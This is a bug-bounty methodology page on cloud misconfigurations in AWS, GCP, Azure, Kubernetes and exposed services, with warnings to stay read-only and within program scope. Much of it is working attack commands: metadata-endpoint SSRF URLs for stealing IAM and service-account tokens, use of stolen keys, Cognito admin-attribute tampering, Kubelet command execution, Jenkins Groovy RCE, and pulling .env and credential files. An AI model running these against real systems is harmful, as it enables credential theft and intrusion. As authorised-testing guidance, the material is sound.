---
icon: lucide/cloud
tags:
  - cloud
  - aws
  - gcp
  - azure
  - kubernetes
  - misconfiguration
  - bug-bounty
description: Cloud misconfigurations — exposed storage, unauthenticated APIs, leaked credentials, and open dashboards — are consistently Critical-severity findings with minimal exploitation complexity.
---

# Cloud 

Cloud misconfigurations sit at the intersection of developer convenience and catastrophic security failure. The attack surface is the entire public internet: S3 buckets, metadata endpoints, unauthenticated databases, admin panels — all reachable without credentials because someone left a door open. The skill is systematic enumeration, not novel exploitation.

<div class="grid cards" markdown>

-   :simple-amazonaws:{ .lg .middle } __AWS__

    ---

    S3 bucket enumeration, EC2 metadata credential theft, exposed IAM keys, and Cognito identity pool misconfigurations.

    [:octicons-arrow-right-24: AWS misconfigs](#aws)

-   :simple-googlecloud:{ .lg .middle } __GCP__

    ---

    GCS bucket access, open Firebase databases, and service account token extraction via metadata endpoint SSRF.

    [:octicons-arrow-right-24: GCP misconfigs](#google-cloud-platform-gcp)

-   :simple-microsoftazure:{ .lg .middle } __Azure__

    ---

    Public blob container enumeration, BlobHunter discovery, and management token extraction via metadata SSRF.

    [:octicons-arrow-right-24: Azure misconfigs](#microsoft-azure)

-   :material-magnify-scan:{ .lg .middle } __Generic Cloud Recon__

    ---

    Provider fingerprinting, multi-cloud asset discovery with CloudEnum, and Nuclei template coverage.

    [:octicons-arrow-right-24: Cloud recon](#generic-cloud-recon)

-   :simple-kubernetes:{ .lg .middle } __Kubernetes__

    ---

    Exposed dashboards, unauthenticated Kubelet APIs, and SSRF paths into internal cluster services.

    [:octicons-arrow-right-24: Kubernetes](#kubernetes-and-container-misconfigurations)

-   :material-monitor-dashboard:{ .lg .middle } __Exposed Services__

    ---

    Elasticsearch, Redis, MongoDB, Jenkins, Jupyter, Spring Boot Actuator, and debug mode exposures.

    [:octicons-arrow-right-24: Exposed services](#exposed-services-and-panels)

</div>

## Decision Flow

```
Target runs on AWS (amazonaws.com CNAMEs, CloudFront, ELB)?
→ Enumerate S3 buckets using naming patterns + S3Scanner.
→ Check DNS for CNAMEs pointing to s3.amazonaws.com — NoSuchBucket = takeover candidate.

Found SSRF on an AWS-hosted target?
→ Hit http://169.254.169.254/latest/meta-data/iam/security-credentials/ for IAM role credentials.
→ Validate stolen creds with aws sts get-caller-identity, then enumerate read-only.

Found AWS keys in JS, .env, or GitHub?
→ Validate the key prefix (AKIA/ASIA), call sts get-caller-identity, enumerate with enumerate-iam.
→ Report key ID prefix + account output only — do not exercise write permissions.

Target uses Firebase or GCP?
→ Extract projectId from JS firebaseConfig, hit <project>.firebaseio.com/.json.
→ For GCP SSRF: hit metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token.

Target exposes non-standard ports (httpx scan)?
→ Check 9200 (Elasticsearch), 6379 (Redis), 27017 (MongoDB), 3000 (Grafana), 8080 (Jenkins), 8888 (Jupyter).
→ Each has unauthenticated-by-default configurations to probe.

Target runs Kubernetes?
→ Port scan for 6443, 8001, 10250, 10255 on discovered IPs and subdomain ranges.
→ Unauthenticated /api/v1/pods or /api/v1/namespaces/default/secrets = Critical.

Not sure what cloud infrastructure is in scope?
→ Run CloudEnum with the target keyword, check httpx output for cloud provider hostnames.
→ Run Nuclei with exposures/, misconfiguration/, and cloud/ template categories.
```

---

## AWS

### S3 Bucket Enumeration

**When to use:** Any AWS-hosted target, or when DNS recon reveals CNAMEs pointing to `s3.amazonaws.com`.

S3 buckets follow predictable naming conventions derived from the target company name. Enumerate variations first, then validate access level. Public `ListBucket` is Medium; public read or write is Critical.

```bash title="s3_bucket_enum.sh"
# Common naming patterns to brute-force:
# target.com, target-com, targetcom, target-assets, target-static,
# target-media, target-uploads, target-backup, target-logs,
# target-dev, target-staging, target-prod, target-data, target-cdn

# S3Scanner: checks existence and permissions
s3scanner scan --buckets-file buckets.txt
s3scanner scan --bucket target-backup

# CloudBrute: broader multi-cloud asset discovery
cloudbrute -d target.com -k target -m s3 \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

# Validate access level via AWS CLI (unauthenticated):
aws s3 ls s3://target-backup --no-sign-request           # public read?
aws s3 cp /tmp/test.txt s3://target-backup/ --no-sign-request  # public write?
aws s3api get-bucket-acl --bucket target-backup --no-sign-request
aws s3api get-bucket-policy --bucket target-backup --no-sign-request
```

```bash title="s3_contents_enum.sh"
# Flag CNAMEs pointing at S3 during DNS recon:
grep "s3.amazonaws.com" dns_cnames.txt
# NoSuchBucket response = bucket name exists but unclaimed = takeover candidate
# XML listing response = public ListBucket access confirmed

# High-value file patterns inside a readable bucket:
aws s3 ls s3://target-backup/ --recursive --no-sign-request | head -100
aws s3 ls s3://target-backup/ --recursive --no-sign-request | \
  grep -iE "(\.env|config|credentials|password|secret|private|key|backup|dump|\.sql|\.bak)"
aws s3 cp s3://target-backup/.env /tmp/target_env --no-sign-request
```

| Access Level | Severity |
|---|---|
| Public `ListBucket` only (filenames visible) | Medium |
| Public read (files readable) | High |
| Sensitive data in readable bucket | Critical |
| Public write or delete access | Critical |

!!! warning
    Do not download bulk data. Copy one representative file to confirm read access, then stop. Bulk exfiltration of production data exceeds the scope of most programs.

---

### EC2 Metadata via SSRF

**When to use:** Any SSRF vulnerability on an AWS-hosted target. See [Part 5 — SSRF](#) for full exploitation methodology.

```bash title="aws_metadata_endpoints.sh"
# IMDSv1 requires no authentication header:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data        # often contains hardcoded secrets
http://169.254.169.254/latest/meta-data/local-ipv4

# After credential theft — validate and enumerate read-only:
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws s3 ls
aws secretsmanager list-secrets
aws ssm describe-parameters
```

---

### Exposed AWS Keys

**When to use:** Keys surface in JS files, `.env` files, GitHub commits, or accessible S3 buckets during recon.

```bash title="aws_key_validation.sh"
# Key formats: AKIA... (long-term), ASIA... (STS temporary)

# Validate:
aws sts get-caller-identity \
  --access-key-id "AKIA..." \
  --secret-access-key "..."
# Account ID returned = valid key = Critical

# Enumerate permissions without triggering GuardDuty (read-only):
python3 enumerate-iam.py \
  --access-key AKIA... \
  --secret-key ... \
  --region us-east-1

aws iam get-user
aws iam list-groups-for-user --user-name <user>
aws iam list-attached-user-policies --user-name <user>
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

| Report field | What to include |
|---|---|
| Key ID | First 10 characters only |
| Secret key | First 4 characters + `***` |
| Evidence | `aws sts get-caller-identity` output |
| Permissions | Role/user policies, what was accessible |

!!! danger
    Stop at read-only confirmation. Do not attempt privilege escalation, lateral movement, or any write/destructive action. `sts get-caller-identity` plus a permissions list is sufficient evidence for Critical severity.

---

### Cognito Misconfiguration

**When to use:** Target uses AWS Cognito for authentication — User Pool IDs and App Client IDs visible in JS or mobile app bundles.

```bash title="cognito_enum.sh"
# Locate Cognito identifiers in JS:
grep -rE "us-east-1_[A-Za-z0-9]+" ./js_files/    # User Pool ID
grep -rE '"[0-9a-z]{26}"' ./js_files/              # App Client ID

# Test unauthenticated identity pool access:
aws cognito-identity get-id \
  --account-id <account_id> \
  --identity-pool-id us-east-1:xxxxxxxx \
  --region us-east-1

aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:xxxxxxxx \
  --region us-east-1
# Credentials returned = unauthenticated AWS access

# Test open self-registration:
aws cognito-idp sign-up \
  --client-id <app_client_id> \
  --username attacker@evil.com \
  --password Password123! \
  --region us-east-1

# Test admin attribute manipulation on your own account:
aws cognito-idp update-user-attributes \
  --access-token <your_token> \
  --user-attributes Name=custom:role,Value=admin \
  --region us-east-1
```

---

## Google Cloud Platform (GCP)

### GCS Bucket Misconfiguration

**When to use:** Any GCP-hosted target, or when JS files reference `storage.googleapis.com` or `gs://` URLs.

```bash title="gcs_enum.sh"
# Unauthenticated access checks:
curl -s "https://storage.googleapis.com/target-bucket"          # XML listing = Critical
curl -s "https://storage.googleapis.com/target-bucket/config.json"

# gsutil (no auth):
gsutil ls gs://target-bucket
gsutil cat gs://target-bucket/.env
gsutil cp test.txt gs://target-bucket/    # write test

# Bucket name discovery:
python3 GCPBucketBrute.py --keyword target --out gcs_results.txt

# Find GCS references in JS:
grep -rE '"gs://[^"]+"' ./js_files/
grep -rE 'storage\.googleapis\.com/[^"]+' ./js_files/
```

---

### Firebase Exposed Databases

**When to use:** Target uses Firebase — `firebaseio.com` domain or `firebaseConfig` object in JS source.

Firebase Realtime Database defaults to open read/write rules in development, and those settings frequently reach production.

```bash title="firebase_enum.sh"
# Check for public read access:
curl -s "https://target-default-rtdb.firebaseio.com/.json"
# Any JSON response = entire database readable = Critical

# Common URL variations:
# https://<project-id>.firebaseio.com/.json
# https://<project-id>-default-rtdb.firebaseio.com/users.json
# https://<project-id>-default-rtdb.firebaseio.com/admin.json

# Extract project ID from JS:
grep -rE '"databaseURL": "https://[^"]+"' ./js_files/
grep -rE '"projectId": "[^"]+"' ./js_files/

# Test write access:
curl -s -X PUT \
  "https://target-default-rtdb.firebaseio.com/test.json" \
  -d '"pwned"'
# "pwned" returned = public write access = Critical
```

---

### GCP Metadata Endpoint

**When to use:** SSRF on a GCP-hosted target. Requires the `Metadata-Flavor: Google` header.

```bash title="gcp_metadata_ssrf.sh"
# Service account OAuth token:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Project and instance context:
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
# Instance attributes often contain startup scripts, SSH keys, and credentials
```

---

## Microsoft Azure

### Azure Blob Storage Misconfiguration

**When to use:** Azure-hosted targets, or when DNS or JS reveals `blob.core.windows.net` hostnames.

```bash title="azure_blob_enum.sh"
# Check for public container listing:
curl -s "https://targetaccount.blob.core.windows.net/container?restype=container&comp=list"
# XML listing returned = public access enabled

# Find storage account references in JS:
grep -rE "[a-z0-9]+\.blob\.core\.windows\.net" ./js_files/

# BlobHunter: automated discovery across an organization's namespace
python3 BlobHunter.py -a targetcompany
```

---

### Azure Metadata Endpoint

**When to use:** SSRF on an Azure-hosted target. Requires the `Metadata: true` header.

```bash title="azure_metadata_ssrf.sh"
# Instance metadata:
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Management API token:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# access_token returned = Azure management API access = Critical
```

---

## Generic Cloud Recon

### Cloud Asset Discovery

**When to use:** Early in recon when the target's cloud footprint is unknown.

```bash title="cloud_fingerprint.sh"
# Provider fingerprinting by hostname pattern:
# AWS:   *.amazonaws.com, *.cloudfront.net, *.elb.amazonaws.com
# GCP:   *.googleapis.com, *.appspot.com, *.run.app, *.cloudfunctions.net
# Azure: *.azurewebsites.net, *.blob.core.windows.net, *.azure.com

# Flag cloud-hosted endpoints in httpx output:
cat httpx_out.txt | grep -iE "amazonaws|googleapis|azurewebsites|cloudfront|heroku"

# CloudEnum: multi-cloud bucket + asset discovery
python3 cloud_enum.py -k targetcompany

# Certificate transparency for cloud-hosted assets:
curl -s "https://crt.sh/?q=%.amazonaws.com&output=json" | \
  jq -r '.[].name_value' | grep "target" | sort -u
```

| Provider | Asset types CloudEnum checks |
|---|---|
| AWS | S3 buckets, Lambda URLs |
| GCP | GCS buckets, Cloud Functions, App Engine |
| Azure | Blob storage, Azure websites, Functions |

---

### Nuclei Cloud Templates

**When to use:** After initial asset discovery — run against all discovered hosts.

```bash title="nuclei_cloud.sh"
# Broad cloud misconfiguration sweep:
nuclei -l discovered_hosts.txt \
  -t exposures/configs/ \
  -t exposures/files/ \
  -t cloud/ \
  -severity medium,high,critical \
  -o nuclei_cloud.txt

# Targeted templates:
nuclei -u https://target.com \
  -t exposures/configs/aws-config-exposure.yaml \
  -t exposures/configs/firebase-config.yaml \
  -t exposures/configs/gcloud-config.yaml \
  -t exposures/files/gcp-service-account-file.yaml

# S3 bucket list as targets:
nuclei -l s3_bucket_list.txt \
  -t vulnerabilities/other/s3-bucket-public-read.yaml
```

---

## Kubernetes and Container Misconfigurations

### Exposed Kubernetes Dashboard

**When to use:** Target infrastructure exposes Kubernetes-related subdomains, or port scanning reveals 8001, 6443, or 30000.

```bash title="k8s_dashboard_enum.sh"
# Port scan for Kubernetes services:
httpx -l dns_resolved.txt \
  -p 8001,8080,8443,6443,10250,10255 \
  -path "/api/v1/pods" \
  -mc 200 \
  -silent

# Unauthenticated API server access:
curl -sk https://target-k8s.target.com:6443/api/v1/pods
curl -sk https://target-k8s.target.com:6443/api/v1/namespaces/default/secrets
# Any successful response = Critical
```

---

### Unauthenticated Kubelet API

**When to use:** Node IPs obtained via cloud metadata SSRF, Kubernetes API access, or Shodan (`port:10255 kubernetes`).

Port 10255 is read-only; port 10250 allows command execution if anonymous authentication is enabled.

```bash title="kubelet_enum.sh"
# Port 10255 — read-only, no auth in older configs:
curl -sk http://target-node:10255/pods
curl -sk http://target-node:10255/metrics

# Port 10250 — full API with anonymous auth:
curl -sk https://target-node:10250/pods
curl -sk https://target-node:10250/run/default/<pod-name>/<container-name> \
  -d "cmd=id"
# Command output returned = container RCE = Critical
```

!!! danger
    Command execution via the Kubelet API runs directly inside a production container. Stop at `id` to confirm RCE — do not run destructive commands or attempt to read cluster secrets beyond what's needed to demonstrate impact.

---

### SSRF to Internal Kubernetes Services

**When to use:** SSRF vulnerability on a target running inside a Kubernetes cluster.

```bash title="k8s_ssrf_paths.sh"
# Kubernetes API via in-cluster DNS:
?url=http://kubernetes.default.svc/api/v1/namespaces/default/secrets

# Service account token from pod filesystem:
?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
?url=file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Authenticate to K8s API with stolen token:
curl -sk https://kubernetes.default.svc/api/v1/pods \
  -H "Authorization: Bearer <token>"

# Internal service discovery:
?url=http://service-name.namespace.svc.cluster.local/
```

---

## Exposed Services and Panels

### Exposed Admin Panels and Internal Tools

**When to use:** Port scan or content discovery reveals non-standard ports on in-scope hosts.

=== "Databases"

    ```bash title="exposed_databases.sh"
    # Elasticsearch (unauthenticated by default pre-8.x):
    curl -s http://target.com:9200/_cat/indices?v
    curl -s http://target.com:9200/_all/_search
    curl -s http://target.com:9200/_cluster/health

    # Redis (no auth by default):
    redis-cli -h target.com -p 6379 ping
    redis-cli -h target.com info
    redis-cli -h target.com keys '*'

    # MongoDB (no auth by default pre-3.6):
    mongo target.com:27017 --eval "db.adminCommand({listDatabases:1})"
    curl http://target.com:28017/
    ```

=== "Dev & Admin Tools"

    ```bash title="exposed_panels.sh"
    # Grafana (default admin:admin):
    # http://target.com:3000/
    # Datasources in UI may contain DB credentials

    # Jenkins — check for unauthenticated Script Console:
    # http://target.com:8080/script
    # Groovy RCE: println("id".execute().text)

    # Jupyter Notebook (no token = Python RCE):
    # http://target.com:8888/

    # Prometheus (internal service map):
    curl -s http://target.com:9090/targets
    curl -s http://target.com:9090/metrics
    ```

| Service | Port | What's Exposed |
|---|---|---|
| Elasticsearch | 9200 | All indexed data |
| Kibana | 5601 | Elasticsearch UI + full data access |
| Redis | 6379 | All keys including session tokens |
| MongoDB | 27017 | All databases |
| Grafana | 3000 | Dashboards, datasource credentials |
| Jenkins | 8080 | Groovy script console → RCE |
| Jupyter | 8888 | Python execution → RCE |
| Prometheus | 9090 | Internal IP map, service inventory |

---

### Exposed Debug Interfaces

**When to use:** Errors or non-standard responses suggest development mode is active in production.

```bash title="debug_mode_checks.sh"
# Laravel debug mode — trigger with malformed input:
curl -s "https://target.com/api/test" -d 'invalid={"'
# Laravel debug page = full .env contents visible in response

# Django debug mode — trigger 404:
curl -s "https://target.com/nonexistent/"
# Django debug page = settings, installed apps, URL patterns

# Spring Boot Actuator:
curl -s https://target.com/actuator
curl -s https://target.com/actuator/env         # environment variables + credentials
curl -s https://target.com/actuator/logfile      # application logs
curl -s https://target.com/actuator/mappings     # all URL routes

# PHP info pages:
# https://target.com/phpinfo.php
# https://target.com/info.php
# https://target.com/test.php
```

```bash title="nuclei_exposures.sh"
nuclei -l httpx_out.txt \
  -t exposures/ \
  -t technologies/ \
  -t misconfiguration/ \
  -severity medium,high,critical \
  -o nuclei_exposures.txt
```

---

### Exposed .git and Config Files

**When to use:** Content discovery on every target as a baseline check. See [Part 1 — Recon](#) for full methodology.

```bash title="exposed_files_quick.sh"
# .git directory:
curl -s https://target.com/.git/HEAD
# "ref: refs/heads/main" = exposed
git-dumper https://target.com/.git ./dumped_repo
git log --oneline && grep -r "password\|secret\|key" .

# Config file paths to test on every target:
# /.env  /.env.local  /.env.production  /.env.staging
# /config.json  /config.yml  /appsettings.json
# /web.config  /database.yml  /.aws/credentials
# /docker-compose.yml
```

---

??? note "Expand full checklist"

    ```
    AWS
    □ S3 bucket enumeration: naming patterns + S3Scanner
    □ DNS CNAME to s3.amazonaws.com → check for takeover or public access
    □ Bucket found: aws s3 ls --no-sign-request (read?) and cp (write?)
    □ Bucket contents: scan for .env, config, credentials, backups, SQL dumps
    □ EC2 metadata via SSRF: /latest/meta-data/iam/security-credentials/
    □ Exposed AWS keys in JS/GitHub: validate with sts get-caller-identity
    □ Cognito: open self-registration, unauthenticated identity pool credentials

    GCP
    □ GCS buckets: storage.googleapis.com/<bucket> → public access?
    □ Firebase: <project>.firebaseio.com/.json → open read/write?
    □ Find Firebase project ID in JS files
    □ GCP metadata via SSRF: metadata.google.internal → service account token

    AZURE
    □ Azure Blob: <account>.blob.core.windows.net → public container listing?
    □ Azure metadata via SSRF: 169.254.169.254/metadata/identity
    □ BlobHunter for storage account discovery

    KUBERNETES
    □ Kubernetes dashboard: ports 8001, 30000, 443
    □ API server: port 6443 → unauthenticated access to pods/secrets?
    □ Kubelet: port 10255 (read-only) / 10250 (exec) → anonymous auth?
    □ SSRF to kubernetes.default.svc → list secrets
    □ Service account token via SSRF: file:///var/run/secrets/...

    EXPOSED SERVICES
    □ Elasticsearch port 9200: _cat/indices, _all/_search
    □ Redis port 6379: ping, keys, get
    □ MongoDB port 27017: unauthenticated listDatabases
    □ Grafana port 3000: default admin:admin credentials
    □ Jenkins port 8080: unauthenticated + script console RCE
    □ Jupyter port 8888: no token required → Python RCE
    □ Prometheus port 9090: targets endpoint → internal service map

    EXPOSED FILES AND PANELS
    □ /.git/HEAD → dump repo with git-dumper
    □ /.env and variants → credentials
    □ Spring Boot /actuator/env → environment variables
    □ Laravel/Django debug mode → full config exposure
    □ PHP info pages: phpinfo.php, info.php
    □ Nuclei: exposures/ + misconfiguration/ templates on all hosts
    ```

---

## References

<div class="grid cards" markdown>

-   :material-school:{ .lg .middle } __Practice Labs__

    ---

    Dedicated AWS and GCP misconfiguration practice environments built around real vulnerability classes.

    [:octicons-arrow-right-24: flaws.cloud](http://flaws.cloud)
    [:octicons-arrow-right-24: flaws2.cloud](http://flaws2.cloud)
    [:octicons-arrow-right-24: thunder CTF (GCP)](https://thunder-ctf.cloud)

-   :material-tools:{ .lg .middle } __Tools__

    ---

    Core tools for cloud storage enumeration, IAM analysis, and multi-cloud asset discovery.

    [:octicons-arrow-right-24: S3Scanner](https://github.com/sa7mon/S3Scanner)
    [:octicons-arrow-right-24: CloudEnum](https://github.com/initstring/cloud_enum)
    [:octicons-arrow-right-24: GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute)
    [:octicons-arrow-right-24: BlobHunter](https://github.com/Sysdig/BlobHunter)
    [:octicons-arrow-right-24: enumerate-iam](https://github.com/andresriancho/enumerate-iam)

-   :material-file-code:{ .lg .middle } __Nuclei Templates__

    ---

    Community-maintained detection templates for cloud misconfigurations and exposed services.

    [:octicons-arrow-right-24: nuclei-templates/cloud](https://github.com/projectdiscovery/nuclei-templates/tree/main/cloud)

-   :material-book-open-variant:{ .lg .middle } __References__

    ---

    Comprehensive cloud pentesting methodology and a curated AWS security tooling inventory.

    [:octicons-arrow-right-24: HackTricks Cloud](https://cloud.hacktricks.xyz)
    [:octicons-arrow-right-24: AWS Security Tools](https://github.com/toniblyx/my-arsenal-of-aws-security-tools)

</div>